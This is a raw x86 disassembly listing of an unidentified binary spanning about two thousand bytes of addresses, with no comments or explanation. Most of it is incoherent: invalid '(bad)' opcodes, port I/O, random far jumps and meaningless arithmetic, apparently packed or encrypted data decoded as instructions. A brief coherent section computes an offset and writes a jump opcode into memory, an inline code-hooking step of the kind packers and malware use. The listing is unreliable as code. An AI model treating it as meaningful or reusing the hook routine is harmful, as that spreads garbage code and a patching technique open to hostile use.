  41f9f2:	sub    eax,0x4808e5e0
  41f9f7:	pop    ss
  41f9f8:	cli    
  41f9f9:	push   0xffffffb8
  41f9fb:	ja     0x41f9b4
  41f9fd:	xchg   eax,esi
  41f9ff:	push   ecx
  41fa00:	dec    eax
  41fa01:	ret    0x7494
  41fa04:	and    BYTE PTR [edi+ecx*4+0x22e916e1],0x5f
  41fa0c:	fwait
  41fa0d:	cld    
  41fa0e:	scas   al,BYTE PTR es:[edi]
  41fa0f:	sahf   
  41fa10:	or     eax,0x3523b8c8
  41fa15:	push   edi
  41fa16:	in     al,dx
  41fa17:	pop    ebx
  41fa18:	(bad)  
  41fa19:	shl    BYTE PTR [eax-0x101c293d],1
  41fa1f:	repz fs jbe 0x41fa19
  41fa23:	jecxz  0x41f9b1
  41fa25:	sub    BYTE PTR [ebx],cl
  41fa27:	popa   
  41fa28:	push   ss
  41fa29:	xor    eax,ecx
  41fa2b:	aam    0xb9
  41fa2d:	aas    
  41fa2e:	pusha  
  41fa2f:	inc    ebx
  41fa30:	test   BYTE PTR [esi+0x24],bh
  41fa33:	imul   edx,DWORD PTR [edi+ebp*4-0x5e5acbb7],0xffffffe9
  41fa3b:	rcl    BYTE PTR [ecx+eax*4+0x78],0xfa
  41fa40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa41:	add    esi,DWORD PTR [edx]
  41fa43:	dec    esp
  41fa44:	das    
  41fa45:	loopne 0x41fa82
  41fa47:	mov    ebx,0x65a57724
  41fa4c:	mov    BYTE PTR [edi+0x672d36c5],ch
  41fa52:	scas   al,BYTE PTR es:[edi]
  41fa53:	xchg   ecx,eax
  41fa54:	xor    ecx,edx
  41fa56:	sbb    al,0xf7
  41fa58:	das    
  41fa59:	add    esi,esi
  41fa5b:	ja     0x41fa55
  41fa5d:	imul   edx,eax,0x9ff7a2cb
  41fa63:	fadd   DWORD PTR [ebp+0x57]
  41fa66:	(bad)  
  41fa67:	sar    bh,1
  41fa69:	popf   
  41fa6a:	scas   eax,DWORD PTR es:[edi]
  41fa6b:	xor    DWORD PTR [esi],ebx
  41fa6d:	xor    eax,0x39b60ffd
  41fa72:	and    eax,0xa50991c7
  41fa77:	sbb    ebp,DWORD PTR [ecx-0x201c7b78]
  41fa7d:	xchg   ecx,eax
  41fa7e:	cdq    
  41fa7f:	or     al,0x43
  41fa81:	and    BYTE PTR [edx-0x4e],ah
  41fa84:	jge    0x41fa19
  41fa86:	ret    
  41fa87:	ins    DWORD PTR es:[edi],dx
  41fa88:	(bad)  
  41fa89:	adc    eax,0xd04930b8
  41fa8e:	fdivr  DWORD PTR [edi+0x74bd8719]
  41fa94:	loope  0x41fab3
  41fa96:	leave  
  41fa97:	inc    esp
  41fa98:	jno    0x41fa6a
  41fa9a:	sub    DWORD PTR [eax],0xfffffff7
  41fa9d:	mul    DWORD PTR [edx-0x36d0f1f9]
  41faa3:	ss add eax,0x86b33539
  41faa9:	inc    esi
  41faaa:	shl    DWORD PTR [edx+0x10],cl
  41faad:	pop    edx
  41faae:	repnz sbb dh,cl
  41fab1:	aam    0x25
  41fab3:	adc    al,0xd1
  41fab5:	(bad)  
  41fab6:	xor    dh,BYTE PTR [edi]
  41fab8:	dec    esp
  41fab9:	mov    eax,ds:0x3d5c90f7
  41fabe:	shl    BYTE PTR [ebx-0x5a2115cd],0xf7
  41fac5:	lods   al,BYTE PTR ds:[esi]
  41fac6:	xchg   edi,eax
  41fac7:	out    0xd5,eax
  41fac9:	cmp    edi,ecx
  41facb:	inc    esi
  41facc:	stos   BYTE PTR es:[edi],al
  41facd:	pop    ebp
  41facf:	cmp    al,0x99
  41fad1:	hlt    
  41fad2:	int3   
  41fad3:	jle    0x41faeb
  41fad5:	mov    ch,0x20
  41fad7:	xchg   DWORD PTR [edx],esi
  41fad9:	cdq    
  41fada:	mov    cl,BYTE PTR [eax-0x17]
  41fadd:	adc    ebx,ebp
  41fadf:	loope  0x41fb1d
  41fae1:	icebp  
  41fae2:	test   al,0xb0
  41fae4:	lock lods eax,DWORD PTR ds:[esi]
  41fae6:	pop    eax
  41fae7:	dec    esp
  41fae8:	jo     0x41fb37
  41faea:	sub    ecx,DWORD PTR [ecx+esi*1+0x5f]
  41faee:	push   ebx
  41faef:	xchg   ecx,eax
  41faf0:	cmc    
  41faf1:	sub    BYTE PTR [ecx],0xeb
  41faf4:	daa    
  41faf5:	mov    ch,0xfa
  41faf7:	rol    BYTE PTR [ecx+0x56249e9c],cl
  41fafd:	scas   eax,DWORD PTR es:[edi]
  41fafe:	xchg   edx,eax
  41faff:	inc    ebp
  41fb00:	push   eax
  41fb01:	in     eax,0xbe
  41fb03:	pop    edi
  41fb04:	xor    BYTE PTR [ecx+0x185e614d],dl
  41fb0a:	dec    eax
  41fb0b:	mov    dl,0x26
  41fb0d:	ss mov cl,0xd
  41fb10:	(bad)  
  41fb11:	sub    esi,DWORD PTR ds:0xe6ccbd8c
  41fb17:	arpl   WORD PTR [ebx],ax
  41fb19:	leave  
  41fb1a:	jl     0x41fb43
  41fb1c:	sub    DWORD PTR [ebx-0x4bc899bb],0x42eb3932
  41fb26:	repz out dx,eax
  41fb28:	cmp    edx,DWORD PTR [esp+edi*2-0x40]
  41fb2c:	shl    DWORD PTR [ecx],cl
  41fb2e:	fsub   st,st(6)
  41fb30:	shr    BYTE PTR [ecx+eiz*4-0x7edff05e],1
  41fb37:	int3   
  41fb38:	pop    ss
  41fb39:	mov    al,ds:0x758074af
  41fb3e:	out    dx,al
  41fb3f:	inc    edi
  41fb40:	cmp    dh,BYTE PTR [ecx-0x7e]
  41fb43:	sub    eax,0x19159ec
  41fb48:	out    0x84,al
  41fb4a:	cdq    
  41fb4b:	or     edx,DWORD PTR [ebp+0x4d]
  41fb4e:	cmp    al,0xd3
  41fb50:	mov    BYTE PTR [ebx-0x1f],0x54
  41fb54:	sbb    DWORD PTR [ebp+0x362c877e],eax
  41fb5a:	ins    BYTE PTR es:[edi],dx
  41fb5b:	pusha  
  41fb5c:	jb     0x41fb4d
  41fb5e:	cmp    DWORD PTR [esi-0x36],edx
  41fb61:	stos   BYTE PTR es:[edi],al
  41fb62:	add    ah,al
  41fb64:	push   ds
  41fb65:	jge    0x41fb35
  41fb67:	add    DWORD PTR [ecx],edi
  41fb69:	xchg   esp,eax
  41fb6a:	imul   edi,DWORD PTR [eax],0xffffffd0
  41fb6d:	jbe    0x41fb0d
  41fb6f:	sbb    BYTE PTR [eax+ebp*8+0xa703ea3],bl
  41fb76:	inc    ebp
  41fb77:	jmp    0xcd50:0xa905f473
  41fb7e:	scas   eax,DWORD PTR es:[edi]
  41fb7f:	add    ch,BYTE PTR [edi+0x5933e246]
  41fb85:	sub    ah,ch
  41fb87:	popf   
  41fb88:	test   al,0x25
  41fb8a:	lea    edx,[ecx]
  41fb8c:	sahf   
  41fb8d:	dec    esi
  41fb8e:	push   esi
  41fb8f:	mov    edi,0xce116047
  41fb94:	daa    
  41fb95:	dec    ebp
  41fb96:	push   edi
  41fb97:	lods   al,BYTE PTR ds:[esi]
  41fb98:	ret    
  41fb99:	arpl   WORD PTR [ebx-0x75ef840a],ax
  41fb9f:	dec    ecx
  41fba0:	sbb    dh,ah
  41fba2:	jle    0x41fc00
  41fba4:	sbb    edx,DWORD PTR [edx]
  41fba6:	popa   
  41fba7:	mov    bh,0x57
  41fba9:	and    DWORD PTR [eax],0xc34edb6f
  41fbaf:	gs (bad) 
  41fbb1:	bound  ebx,QWORD PTR [edx]
  41fbb3:	ret    0xea0f
  41fbb6:	sub    eax,0xf6ba549f
  41fbbb:	daa    
  41fbbc:	xor    BYTE PTR [edi+0x4012d382],bh
  41fbc2:	fsubr  st,st(6)
  41fbc4:	ret    
  41fbc5:	(bad)  
  41fbc6:	xlat   BYTE PTR ds:[ebx]
  41fbc7:	shr    DWORD PTR [edx+0x34],0xee
  41fbcb:	sbb    esi,DWORD PTR [ecx]
  41fbcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbce:	es scas al,BYTE PTR es:[edi]
  41fbd0:	ss push ecx
  41fbd2:	jle    0x41fc05
  41fbd4:	(bad)  
  41fbd5:	das    
  41fbd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbd7:	push   esi
  41fbd8:	mov    BYTE PTR [ecx-0x6a],bl
  41fbdb:	jo     0x41fc34
  41fbdd:	(bad)  
  41fbde:	out    0xca,eax
  41fbe0:	cli    
  41fbe1:	sbb    al,0xbc
  41fbe3:	and    al,0x25
  41fbe5:	xchg   esi,eax
  41fbe6:	test   DWORD PTR [esi],ebp
  41fbe8:	mov    esi,0xa2324ce0
  41fbed:	aam    0x5d
  41fbef:	ins    DWORD PTR es:[edi],dx
  41fbf0:	jbe    0x41fbc1
  41fbf2:	xor    bl,0x6
  41fbf5:	out    0x57,al
  41fbf7:	jl     0x41fbe7
  41fbf9:	mov    DWORD PTR ds:0xcc43ca52,esp
  41fbff:	arpl   WORD PTR [esi+esi*4],sp
  41fc02:	inc    esp
  41fc03:	push   ebp
  41fc04:	cmp    edi,DWORD PTR [edi-0x2c]
  41fc07:	(bad)  
  41fc08:	push   ss
  41fc09:	repz xor DWORD PTR [ebx+0x4f],ebx
  41fc0d:	mov    cl,0x33
  41fc0f:	add    DWORD PTR [ebp-0x7335b5d0],eax
  41fc15:	out    0x79,al
  41fc17:	test   DWORD PTR [edx-0x44e419d5],esp
  41fc1d:	retf   
  41fc1e:	sub    eax,0xd36333c
  41fc23:	imul   edi,DWORD PTR [ebp-0x76a6a4e9],0xffffff9f
  41fc2a:	mov    ebx,0x19d67ee9
  41fc2f:	push   eax
  41fc30:	xor    BYTE PTR [ecx],dl
  41fc32:	repz xchg edi,eax
  41fc34:	push   ecx
  41fc35:	imul   ebp,DWORD PTR ds:0x66d3c678,0xf824d38c
  41fc3f:	add    BYTE PTR [esi+0x67],cl
  41fc42:	sti    
  41fc43:	xacquire xchg BYTE PTR [edx-0x46],ch
  41fc47:	(bad)  [ecx-0x46]
  41fc4a:	neg    BYTE PTR [eax+edi*4-0x3b]
  41fc4e:	enter  0x4eec,0x1
  41fc52:	or     bh,ch
  41fc54:	pop    eax
  41fc55:	gs xchg ecx,eax
  41fc57:	cdq    
  41fc58:	test   dl,dh
  41fc5a:	add    BYTE PTR [esi-0x7f],ah
  41fc5d:	mov    edi,0x1664d5e2
  41fc62:	adc    BYTE PTR [edi-0x2efbc7e6],bl
  41fc68:	sbb    ch,BYTE PTR [esp+eiz*2]
  41fc6b:	call   0x7050fee8
  41fc70:	das    
  41fc71:	outs   dx,BYTE PTR ds:[esi]
  41fc72:	inc    ecx
  41fc73:	loopne 0x41fc8e
  41fc75:	mov    al,0xb7
  41fc77:	shl    BYTE PTR [esi-0x759732],1
  41fc7d:	aas    
  41fc7e:	xor    DWORD PTR [edi],ecx
  41fc80:	xor    bl,0xe2
  41fc83:	mov    ds:0xc703c633,eax
  41fc88:	push   eax
  41fc89:	mov    eax,DWORD PTR [ebp-0x24]
  41fc8c:	add    eax,0xaa
  41fc91:	push   eax
  41fc92:	mov    eax,DWORD PTR [ebp-0x24]
  41fc95:	mov    eax,DWORD PTR [eax+0x198]
  41fc9b:	push   DWORD PTR [eax]
  41fc9d:	call   0x423643
  41fca2:	mov    DWORD PTR [ebp-0x14],eax
  41fca5:	lea    eax,[ebp+0x4]
  41fca8:	mov    DWORD PTR [ebp-0x30],eax
  41fcab:	mov    eax,DWORD PTR [ebp-0x14]
  41fcae:	test   eax,eax
  41fcb0:	je     0x422078
  41fcb6:	lea    eax,[ebp-0x8]
  41fcb9:	mov    DWORD PTR [ebp-0x38],eax
  41fcbc:	mov    eax,DWORD PTR [ebp-0x34]
  41fcbf:	mov    DWORD PTR [ebp-0x8],eax
  41fcc2:	mov    eax,DWORD PTR [ebp-0x8]
  41fcc5:	mov    ecx,DWORD PTR [ebp-0x14]
  41fcc8:	sub    eax,ecx
  41fcca:	mov    DWORD PTR [ebp-0x8],eax
  41fccd:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd0:	xor    ecx,esi
  41fcd2:	mov    eax,0xffcd8d14
  41fcd7:	sub    eax,ecx
  41fcd9:	add    DWORD PTR [ebp-0x8],eax
  41fcdc:	mov    eax,DWORD PTR [ebp-0x8]
  41fcdf:	mov    ecx,DWORD PTR [ebp-0x14]
  41fce2:	mov    DWORD PTR [ecx+0x1],eax
  41fce5:	mov    eax,DWORD PTR [ebp-0x14]
  41fce8:	push   DWORD PTR [ebp-0x24]
  41fceb:	mov    BYTE PTR [eax],0xe9
  41fcee:	mov    eax,ds:0x42816b
  41fcf3:	push   DWORD PTR [eax]
  41fcf5:	push   DWORD PTR ds:0x4283c7
  41fcfb:	push   DWORD PTR ds:0x428173
  41fd01:	jmp    0x422061
  41fd06:	inc    edi
  41fd07:	cmp    esi,0x5e
  41fd0a:	mov    dh,0x3
  41fd0c:	(bad)  
  41fd0d:	jnp    0x41fce7
  41fd0f:	sub    DWORD PTR [esi],ebx
  41fd11:	jmp    0x41fd45
  41fd13:	pop    ss
  41fd14:	test   DWORD PTR [eax+0x7a7da9ef],esi
  41fd1a:	aas    
  41fd1b:	pop    edi
  41fd1c:	jp     0x41fd98
  41fd1e:	xchg   BYTE PTR [esi],ah
  41fd20:	test   DWORD PTR [ebx],ecx
  41fd22:	call   0x83ca:0xa795bfd0
  41fd29:	push   edx
  41fd2a:	cs pusha 
  41fd2c:	lds    ebx,FWORD PTR [ebp+0x4]
  41fd2f:	mov    ss,ecx
  41fd31:	adc    eax,0x6ac8b9de
  41fd36:	xchg   ebp,eax
  41fd37:	cs icebp 
  41fd39:	and    BYTE PTR [eax+0x24],dh
  41fd3c:	scas   eax,DWORD PTR es:[edi]
  41fd3d:	loope  0x41fd35
  41fd3f:	xchg   edi,eax
  41fd40:	ins    BYTE PTR es:[edi],dx
  41fd41:	cmp    BYTE PTR [ebx+eiz*4],dh
  41fd44:	data16 xor bh,BYTE PTR [ecx+ebp*4]
  41fd48:	cmp    BYTE PTR [ebp-0x4],bh
  41fd4b:	sbb    al,0xe1
  41fd4d:	js     0x41fdc8
  41fd4f:	mov    ds:0xbc81f2cf,al
  41fd54:	mov    bh,0x50
  41fd56:	add    eax,0x7f3294e
  41fd5b:	into   
  41fd5c:	push   ss
  41fd5d:	rol    DWORD PTR [esi+ecx*1],1
  41fd60:	les    esp,FWORD PTR ds:0xdd084598
  41fd66:	jb     0x41fd3d
  41fd68:	fs push ebx
  41fd6a:	ror    ch,0x9c
  41fd6d:	loopne 0x41fdc0
  41fd6f:	pop    ss
  41fd70:	sub    BYTE PTR [ecx],0x85
  41fd73:	scas   eax,DWORD PTR es:[edi]
  41fd74:	jae    0x41fdcd
  41fd76:	cld    
  41fd77:	loopne 0x41fdbf
  41fd79:	or     edi,DWORD PTR [edx+0x9]
  41fd7c:	cwde   
  41fd7d:	cmpxchg BYTE PTR gs:[ecx-0x5305b4ce],cl
  41fd85:	pop    ss
  41fd86:	addr16 mov eax,0x86cd1b05
  41fd8c:	jno    0x41fdc0
  41fd8e:	aaa    
  41fd8f:	enter  0x5fde,0xce
  41fd93:	ja     0x41fd2e
  41fd95:	push   ebx
  41fd96:	pop    ds
  41fd97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd98:	fimul  WORD PTR [ebx+0x64]
  41fd9b:	push   es
  41fd9c:	xchg   esp,eax
  41fd9d:	pop    ds
  41fd9e:	and    BYTE PTR [ebx],ch
  41fda0:	shl    BYTE PTR [ebp+ecx*1+0x78f959d4],1
  41fda7:	sub    dh,al
  41fda9:	xchg   ecx,eax
  41fdaa:	and    eax,0x6cef372e
  41fdaf:	push   ebx
  41fdb0:	in     al,0x0
  41fdb2:	sar    BYTE PTR [ecx],1
  41fdb4:	int    0x70
  41fdb6:	dec    eax
  41fdb7:	sub    DWORD PTR [edx],edi
  41fdb9:	rcr    BYTE PTR [edi],cl
  41fdbb:	cmp    BYTE PTR [esi-0x2116a323],ch
  41fdc1:	bound  esp,QWORD PTR [ecx+0x73fd8da6]
  41fdc7:	js     0x41fe06
  41fdc9:	inc    eax
  41fdca:	xchg   edi,eax
  41fdcb:	sub    ecx,ebx
  41fdcd:	lds    ecx,FWORD PTR [esi]
  41fdcf:	retf   
  41fdd0:	adc    DWORD PTR [edi+ecx*4-0x54eb8123],0x1b
  41fdd8:	pop    ax
  41fdda:	mov    ch,0xb8
  41fddc:	dec    ecx
  41fddd:	adc    eax,0xba382d9c
  41fde2:	test   DWORD PTR [edx-0x14],0x96a3ca49
  41fde9:	cdq    
  41fdea:	xchg   ebp,eax
  41fdeb:	in     al,0x43
  41fded:	push   0x2c
  41fdef:	jge    0x41fe27
  41fdf1:	inc    esp
  41fdf2:	or     ecx,DWORD PTR [ebp-0x4f]
  41fdf5:	nop
  41fdf6:	ret    0xc50d
  41fdf9:	or     eax,0x7208c621
  41fdfe:	sbb    al,0xad
  41fe00:	jmp    0x41fe31
  41fe02:	jmp    0xe4d72d1c
  41fe07:	pop    ss
  41fe08:	aas    
  41fe09:	shl    BYTE PTR [ebp+0x4],1
  41fe0c:	fadd   st(6),st
  41fe0e:	pop    ds
  41fe0f:	push   eax
  41fe10:	add    al,0xe7
  41fe12:	into   
  41fe13:	mov    ecx,0xc48b8103
  41fe18:	xchg   esi,eax
  41fe19:	dec    edx
  41fe1a:	aad    0xe3
  41fe1c:	gs xchg edi,eax
  41fe1e:	repz xchg ecx,eax
  41fe20:	repnz daa 
  41fe22:	inc    ebp
  41fe23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe24:	mov    ebx,es
  41fe26:	pop    ebp
  41fe27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe28:	or     dl,BYTE PTR [eax-0x2d]
  41fe2b:	sbb    al,BYTE PTR [edi+0x1d]
  41fe2e:	push   esp
  41fe2f:	aas    
  41fe30:	enterw 0xcb01,0x13
  41fe35:	mov    ebx,0x87aa47e6
  41fe3a:	loope  0x41fead
  41fe3c:	loope  0x41fe3b
  41fe3e:	push   edx
  41fe3f:	scas   eax,DWORD PTR es:[edi]
  41fe40:	sub    DWORD PTR [edi-0x52b44e25],ebp
  41fe46:	test   dh,dh
  41fe48:	iret   
  41fe49:	jl     0x41fe05
  41fe4b:	ret    
  41fe4c:	in     eax,dx
  41fe4d:	addr16 sbb eax,0xa16b95df
  41fe53:	stc    
  41fe54:	mov    dl,0x91
  41fe56:	adc    cl,bl
  41fe58:	and    bl,BYTE PTR [edx]
  41fe5a:	push   edi
  41fe5b:	add    BYTE PTR [esi],0x3e
  41fe5e:	sbb    BYTE PTR [edx],0xb2
  41fe61:	stc    
  41fe62:	fnstcw WORD PTR [ebx-0x1]
  41fe65:	ror    BYTE PTR [ebp-0x69e719b5],cl
  41fe6b:	mov    fs,WORD PTR [ebp-0x593fc689]
  41fe71:	leave  
  41fe72:	push   edx
  41fe73:	lock fldenv [ebp+0x24c682b9]
  41fe7a:	pop    ebx
  41fe7b:	fsub   st,st(6)
  41fe7d:	jle    0x41fe4f
  41fe7f:	cmp    esp,DWORD PTR [edi-0x58]
  41fe82:	inc    edx
  41fe83:	sbb    al,0xbe
  41fe85:	or     al,0xff
  41fe87:	and    al,0xf5
  41fe89:	or     DWORD PTR [ebp-0x74],0xffffffe6
  41fe8d:	jl     0x41fe7c
  41fe8f:	sub    ebx,DWORD PTR [edx]
  41fe91:	jl     0x41fee0
  41fe93:	sar    BYTE PTR [ebx+0x1e583f14],1
  41fe99:	call   0x265a:0xe5fdea0
  41fea0:	mov    ebx,0xf118dac1
  41fea5:	mov    eax,ds:0x7f951df9
  41feaa:	imul   eax,DWORD PTR [esi],0xc76d0b26
  41feb0:	and    eax,0xe96132da
  41feb5:	(bad)  
  41feb7:	sar    BYTE PTR [edx-0x4a],1
  41feba:	daa    
  41febb:	nop
  41febc:	call   0xac3c:0x47825472
  41fec3:	mov    bh,0xda
  41fec5:	fwait
  41fec6:	adc    al,0xc3
  41fec8:	out    dx,eax
  41fec9:	and    esp,ebp
  41fecb:	xchg   esp,eax
  41fecc:	and    al,0xca
  41fece:	les    ebx,FWORD PTR [eax+0x2b]
  41fed1:	fwait
  41fed2:	dec    edi
  41fed3:	cmp    eax,0x9696f1f0
  41fed8:	pusha  
  41fed9:	fcmovne st,st(1)
  41fedb:	push   edx
  41fedc:	cld    
  41fedd:	mov    ds:0xb72a46ed,al
  41fee2:	retf   
  41fee3:	das    
  41fee4:	sti    
  41fee5:	mov    WORD PTR [esi-0x7dd4f0c9],ds
  41feeb:	dec    eax
  41feec:	pop    esi
  41feed:	push   ebp
  41feee:	popa   
  41feef:	adc    al,0xf2
  41fef1:	inc    ebp
  41fef2:	jo     0x41fecf
  41fef4:	fstp   QWORD PTR [ebp+0x68]
  41fef7:	pop    ebp
  41fef8:	icebp  
  41fef9:	into   
  41fefa:	pushf  
  41fefb:	std    
  41fefc:	pop    ecx
  41fefd:	mov    DWORD PTR [ebx+0x5a34b2d7],edx
  41ff03:	stos   DWORD PTR es:[edi],eax
  41ff04:	push   esi
  41ff05:	xlat   BYTE PTR ds:[ebx]
  41ff06:	push   0x10158a1f
  41ff0b:	in     eax,dx
  41ff0c:	add    eax,edx
  41ff0e:	mov    ds:0x6feec422,al
  41ff13:	sub    eax,0x3f9d0ecb
  41ff18:	fs outs dx,DWORD PTR es:[esi]
  41ff1b:	add    ebp,DWORD PTR [edi-0x3e]
  41ff1e:	jb     0x41fec6
  41ff20:	xchg   ebx,eax
  41ff21:	mov    DWORD PTR [esi-0x51],esi
  41ff24:	iret   
  41ff25:	loopne 0x41feb1
  41ff27:	neg    DWORD PTR [edi]
  41ff29:	(bad)  [edi-0x66]
  41ff2c:	xor    dl,BYTE PTR [edi-0x59]
  41ff2f:	scas   eax,DWORD PTR es:[edi]
  41ff30:	or     eax,0xcd0dd0da
  41ff35:	imul   ebx,eax,0x3bec1387
  41ff3b:	add    BYTE PTR [esi],dl
  41ff3d:	mov    esp,0xbab596b1
  41ff42:	push   eax
  41ff43:	lds    ecx,FWORD PTR [ecx+eiz*8+0x57]
  41ff47:	jg     0x41ff27
  41ff49:	lahf   
  41ff4a:	shl    DWORD PTR [ebp-0x70bb36cd],1
  41ff50:	fsubrp st(6),st
  41ff52:	xchg   esi,eax
  41ff53:	outs   dx,BYTE PTR ds:[esi]
  41ff54:	dec    ecx
  41ff55:	xchg   ecx,eax
  41ff56:	add    dh,dl
  41ff58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff59:	nop
  41ff5a:	fsub   DWORD PTR [ebx]
  41ff5c:	sub    BYTE PTR [ecx-0x5a50db5e],ch
  41ff62:	(bad)  
  41ff63:	dec    ebp
  41ff65:	imul   BYTE PTR [ecx]
  41ff67:	jnp    0x41ff20
  41ff69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff6a:	pop    esp
  41ff6b:	cdq    
  41ff6c:	add    DWORD PTR [edi],eax
  41ff6e:	mov    BYTE PTR [ebx-0x6a],ah
  41ff71:	mov    ebx,0xbdb831f1
  41ff76:	stos   DWORD PTR es:[edi],eax
  41ff77:	iret   
  41ff78:	int3   
  41ff79:	jecxz  0x41ff27
  41ff7b:	add    ebp,DWORD PTR ds:0x430e1da7
  41ff81:	xor    eax,0x9d32ae87
  41ff86:	mov    ch,0x4d
  41ff88:	xor    BYTE PTR [edi],al
  41ff8a:	pushf  
  41ff8b:	and    al,0x7d
  41ff8d:	xchg   BYTE PTR [si],bh
  41ff90:	loope  0x42000f
  41ff92:	cmp    eax,0x959e51d8
  41ff97:	pop    esi
  41ff98:	outs   dx,DWORD PTR ds:[esi]
  41ff99:	inc    edx
  41ff9a:	or     bh,ch
  41ff9c:	mov    bh,0xf9
  41ff9e:	or     eax,0xe64fc77a
  41ffa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffa4:	pop    esi
  41ffa5:	push   es
  41ffa6:	rcl    BYTE PTR [eax+0x68],0x1c
  41ffaa:	gs pop es
  41ffac:	inc    eax
  41ffad:	js     0x42001a
  41ffaf:	mov    ds:0x5f14da23,al
  41ffb4:	add    DWORD PTR [eax-0x7b26b6d0],esi
  41ffba:	cmp    esi,ebx
  41ffbc:	fild   WORD PTR [ebx]
  41ffbe:	aam    0xb5
  41ffc0:	hlt    
  41ffc1:	hlt    
  41ffc2:	add    DWORD PTR [edi],eax
  41ffc4:	jp     0x420033
  41ffc6:	xor    ah,dl
  41ffc8:	xchg   ebx,eax
  41ffc9:	loope  0x41ff82
  41ffcb:	push   edx
  41ffcc:	jb     0x41ffde
  41ffce:	retf   
  41ffcf:	js     0x420045
  41ffd1:	hlt    
  41ffd2:	stc    
  41ffd3:	push   ebx
  41ffd4:	xor    ah,BYTE PTR [ebp+0x36]
  41ffd7:	jmp    FWORD PTR [esi]
  41ffd9:	push   ebx
  41ffda:	sub    edx,DWORD PTR [esi-0x4f]
  41ffdd:	dec    esi
  41ffde:	jecxz  0x41fff7
  41ffe0:	adc    edi,DWORD PTR [edi+eax*1]
  41ffe3:	or     eax,0x810b09ee
  41ffe8:	and    BYTE PTR ds:0xff604c9b,al
  41ffee:	js     0x420062
  41fff0:	push   0x958e3402
  41fff5:	dec    ebp
  41fff6:	xor    BYTE PTR [edi-0x78884458],cl
  41fffc:	loopne 0x41ff88
  41fffe:	js     0x41fffa
  420000:	popa   
  420001:	in     al,dx
  420002:	jae    0x42000f
  420004:	aam    0x88
  420006:	jmp    0x7b75f2f9
  42000b:	push   ds
  42000c:	mov    esp,0x38fb1ffe
  420011:	(bad)  
  420013:	or     ebx,DWORD PTR [ebp+0x64f7dd31]
  420019:	test   BYTE PTR ds:0x67481d8f,al
  42001f:	or     DWORD PTR [esi-0x5b],edx
  420022:	push   edx
  420023:	sub    al,0xe8
  420025:	mov    al,ds:0x990a6178
  42002a:	inc    eax
  42002b:	jne    0x420078
  42002d:	inc    edi
  42002e:	sub    eax,0xe5edeec
  420033:	mov    ebp,0x86efe2e1
  420038:	ror    BYTE PTR [edi+0x72],1
  42003b:	cmc    
  42003c:	cmp    DWORD PTR [ecx-0x10],esi
  42003f:	mov    ecx,0x65a6e0de
  420044:	push   ebx
  420045:	sub    al,0x49
  420047:	aaa    
  420048:	je     0x42005b
  42004a:	mov    eax,0xeaf46902
  42004f:	(bad)  
  420050:	mov    ds:0x58a11080,al
  420055:	add    DWORD PTR [ebp+0x33],ebp
  420058:	push   ebx
  420059:	pop    es
  42005a:	pop    es
  42005b:	inc    edi
  42005c:	or     eax,0x7a4473d9
  420061:	or     BYTE PTR [edx],0x69
  420064:	mov    DWORD PTR [esp+eiz*8+0x37d7a3ce],ebx
  42006b:	hlt    
  42006c:	add    BYTE PTR [ebp-0x723058ca],al
  420072:	fs push ebx
  420074:	retf   0x25e6
  420077:	ins    BYTE PTR es:[edi],dx
  420078:	ret    
  420079:	mov    dl,0xbb
  42007b:	stc    
  42007c:	xchg   DWORD PTR [ebx+0x3c],ebp
  42007f:	cli    
  420080:	test   BYTE PTR [edx+0x2a],dh
  420083:	lods   al,BYTE PTR ds:[esi]
  420084:	sahf   
  420085:	aas    
  420086:	dec    eax
  420087:	rcl    DWORD PTR ds:0x660336ba,1
  42008d:	pop    si
  42008f:	sub    ebp,edi
  420091:	push   cs
  420092:	and    ch,bh
  420094:	sub    al,0xb2
  420096:	scas   eax,DWORD PTR es:[edi]
  420097:	add    eax,0x993b8532
  42009c:	into   
  42009d:	(bad)  
  42009e:	mov    al,0x88
  4200a0:	jg     0x4200b8
  4200a2:	mov    edi,0x80a23625
  4200a7:	aam    0x7f
  4200a9:	sbb    al,0x6a
  4200ab:	aas    
  4200ac:	imul   edx
  4200ae:	sbb    eax,0x4c29e789
  4200b3:	test   BYTE PTR [edx-0x96c59b5],al
  4200b9:	mov    dh,0x58
  4200bb:	cmp    al,0x3e
  4200bd:	rcr    BYTE PTR [eax-0x7127f25c],0xc8
  4200c4:	stc    
  4200c5:	loop   0x42006c
  4200c7:	push   cs
  4200c8:	loope  0x4200ce
  4200ca:	ror    BYTE PTR [eax],1
  4200cc:	and    DWORD PTR [esi],0x3165ff8d
  4200d2:	arpl   ax,bx
  4200d4:	addr16 lock fcomip st,st(5)
  4200d8:	pop    edi
  4200d9:	rol    BYTE PTR [esi+0x54],0x22
  4200dd:	xchg   esi,eax
  4200de:	mov    ?,esp
  4200e0:	dec    BYTE PTR [ebx+0x59]
  4200e3:	push   ds
  4200e4:	rol    DWORD PTR [ebp-0x24],0x55
  4200e8:	mov    ds:0xd9547975,eax
  4200ed:	mov    ebx,0x306c0e3d
  4200f2:	repnz addr16 out dx,al
  4200f5:	inc    esi
  4200f6:	out    dx,al
  4200f7:	add    eax,0x1447ed1a
  4200fc:	jno    0x42015a
  4200fe:	mov    ch,0x1c
  420100:	mov    ebx,0xab50c61b
  420106:	sahf   
  420107:	push   edx
  420108:	cmp    cl,ah
  42010a:	pop    es
  42010b:	jns    0x42015e
  42010d:	jecxz  0x42013c
  42010f:	popa   
  420110:	dec    edi
  420111:	int3   
  420112:	enter  0xd4ce,0xfe
  420116:	pop    es
  420117:	sbb    DWORD PTR [eax+0x1ec6ca8e],eax
  42011d:	xchg   ebx,eax
  42011e:	out    dx,al
  42011f:	jns    0x420162
  420121:	pop    ecx
  420122:	jbe    0x42010a
  420124:	repz and eax,0x46233eb9
  42012a:	xchg   ebx,eax
  42012b:	lock dec esi
  42012d:	fnstenv [eax-0x3d1efe4c]
  420133:	in     eax,dx
  420134:	mov    cl,0xd3
  420136:	sub    al,0xb4
  420138:	hlt    
  420139:	(bad)  [esi+ebp*4]
  42013c:	ds stos BYTE PTR es:[edi],al
  42013e:	jmp    0x4200ff
